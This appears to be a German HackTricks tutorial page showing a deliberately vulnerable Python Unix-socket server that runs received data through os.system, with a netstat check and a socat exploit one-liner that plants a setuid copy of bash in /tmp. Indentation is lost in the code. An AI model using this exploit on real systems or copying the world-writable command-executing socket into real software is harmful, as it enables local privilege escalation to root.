{{#include ../../banners/hacktricks-training.md}}

## Beispiel für Socket-Bindung mit Python

Im folgenden Beispiel wird ein **Unix-Socket erstellt** (`/tmp/socket_test.s`), und alles, was **empfangen** wird, wird von `os.system` **ausgeführt**. Ich weiß, dass Sie dies nicht in der Wildnis finden werden, aber das Ziel dieses Beispiels ist es zu sehen, wie ein Code, der Unix-Sockets verwendet, aussieht und wie man die Eingabe im schlimmsten Fall verwaltet.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Führen Sie** den Code mit Python aus: `python s.py` und **überprüfen Sie, wie der Socket lauscht**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploits**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
